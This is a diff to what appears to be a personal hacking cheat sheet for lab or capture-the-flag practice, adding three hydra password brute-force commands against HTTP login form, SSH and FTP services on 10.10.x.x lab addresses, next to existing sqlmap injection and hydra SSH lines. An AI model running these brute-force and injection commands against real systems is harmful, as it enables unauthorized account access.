@@ -413,6 +413,9 @@ sqlmap -u http://localchost.com/hey.php?artist=1 --D (tabla) --T artist --C ades
 ````
 hydra -t4 -l lin -P /usr/share/wordlists/rockyou.txt ssh:10.10.149.11
 hydra -l lin -P /usr/share/wordlists/rockyou.txt ssh:10.10.149.118
+hydra -l <username> -P <wordlist> 10.10.210.31 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
+hydra -l <username> -P <full path to pass> 10.10.210.31 -t 4 ssh
+ hydra -l user -P passlist.txt ftp://10.10.210.31
 ````
 #### stego
 ````js
